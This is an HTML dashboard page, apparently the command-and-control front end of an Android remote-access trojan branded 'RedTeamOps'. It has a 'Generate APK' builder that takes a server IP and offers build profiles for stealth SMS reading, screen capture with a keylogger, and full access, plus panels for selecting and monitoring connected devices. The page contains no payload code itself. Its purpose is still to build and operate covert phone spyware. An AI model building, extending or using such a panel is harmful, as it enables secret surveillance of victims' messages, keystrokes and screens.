<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Operations Center</title>

    <!-- Fonts: Inter (UI) & JetBrains Mono (Code) & Material Icons -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Material+Icons&display=swap"
        rel="stylesheet">

    <!-- CSS -->
    <link rel="stylesheet" href="../css/index.css">

    <!-- JS -->
    <script src="../js/socketIo.js" defer></script>
    <script src="../js/jquery.js" defer></script>
    <script src="../js/jquery.nice-select.min.js" defer></script>
    <script src="../js/index.js" defer></script>
</head>

<body>
    <div id="app-layout">
        <!-- Sidebar -->
        <aside id="sidebar">
            <div class="brand-header">
                <img src="../img/trojan-logo.svg" alt="Logo" class="logo">
                <h1>RedTeam<span class="highlight">Ops</span></h1>
            </div>

            <nav class="main-nav">
                <div class="nav-item active"><i class="material-icons">grid_view</i>Dashboard</div>
            </nav>

            <button onclick="logout()" class="logout-btn">
                <i class="material-icons">logout</i>
                <span>Logout</span>
            </button>
        </aside>

        <!-- Main Content -->
        <main id="main-content">
            <!-- Top Bar -->
            <header id="topbar">
                <div class="breadcrumbs">Operations / Dashboard</div>
                <div class="controls">
                    <button onclick="toggleAPKGenerator()" class="apk-gen-toggle" title="Generate Custom APK">
                        <i class="material-icons">build</i>
                        Generate APK
                    </button>
                </div>
            </header>

                        <!-- APK Generator Panel (Hidden by default) -->
            <div id="apkGeneratorPanel" class="apk-generator-panel hidden">
                <div class="apk-gen-header">
                    <h3>Generate Custom APK</h3>
                    <button onclick="toggleAPKGenerator()" class="close-btn">
                        <i class="material-icons">close</i>
                    </button>
                </div>
                
                <div class="apk-gen-body">
                    <!-- Server IP Configuration -->
                    <div class="config-section">
                        <label class="config-label">
                            <i class="material-icons">dns</i>
                            Server IP Address
                        </label>
                        <input 
                            type="text" 
                            id="serverIp" 
                            class="config-input" 
                            placeholder="Auto-detect or enter IP"
                        >
                        <span class="config-hint">Leave empty for auto-detection</span>
                    </div>

                    <!-- Build Profiles -->
                    <div class="config-section">
                        <label class="config-label">
                            <i class="material-icons">settings</i>
                            Select Build Profile
                        </label>
                        <div class="preset-buttons-grid">
                            <button class="preset-card" onclick="generatePreset('stealth')">
                                <i class="material-icons">visibility_off</i>
                                <div class="preset-info">
                                    <span class="preset-name">Stealth Mode</span>
                                    <span class="preset-desc">SMS Read only</span>
                                </div>
                            </button>
                            
                            <button class="preset-card" onclick="generatePreset('remote')">
                                <i class="material-icons">phonelink</i>
                                <div class="preset-info">
                                    <span class="preset-name">Remote Control</span>
                                    <span class="preset-desc">Screen + Keylogger</span>
                                </div>
                            </button>
                            
                            <button class="preset-card" onclick="generatePreset('full')">
                                <i class="material-icons">all_inclusive</i>
                                <div class="preset-info">
                                    <span class="preset-name">Full Access</span>
                                    <span class="preset-desc">All features enabled</span>
                                </div>
                            </button>
                        </div>
                    </div>
                </div>
            </div>


            <!-- Device Selector Panel -->
            <div class="device-selector-panel">
                <div class="selector-header">
                    <h3><i class="material-icons">devices</i> Connected Devices</h3>
                    <span id="deviceCount" class="device-count">0 active</span>
                </div>
                <div id="deviceList" class="device-list">
                    <!-- Populated by JS -->
                    <div class="empty-state">No devices connected</div>
                </div>
            </div>

            <!-- Multi-Device Grid -->
            <div id="multiDeviceGrid" class="multi-device-grid">
                <!-- Device panels dynamically created here -->
                <div class="empty-grid-state">
                    <i class="material-icons">pan_tool</i>
                    <p>Select devices above to begin monitoring</p>
                </div>
            </div>

        </main>
    </div>

    <!-- Notification Container -->
    <div id="msgs"></div>
</body>

</html>